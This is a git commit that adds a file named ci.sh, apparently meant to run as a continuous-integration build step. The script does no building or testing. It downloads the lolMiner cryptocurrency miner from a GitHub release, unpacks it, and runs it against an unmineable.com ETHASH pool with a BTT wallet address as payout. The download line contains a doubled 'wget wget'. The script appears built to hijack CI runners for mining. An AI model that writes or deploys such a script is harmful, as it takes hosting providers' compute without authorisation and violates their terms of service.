c538c139e992e9571b96f427a057abcc818a27e8
fierneerr5678 <86720451+fierneerr5678@users.noreply.github.com>
2021-06-30 18:20:00 +0700

    Create ci.sh

---
+++ ci.sh
@@ -0,0 +1,6 @@
+#btt
+sudo apt update
+wget wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+tar -xvf lolMiner_v1.29_Lin64.tar.gz
+cd 1.29
+./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BTT:TZ3zk8z2A3ugi85Ct1CerbWbfTXmrhf87k.mesinBTT1
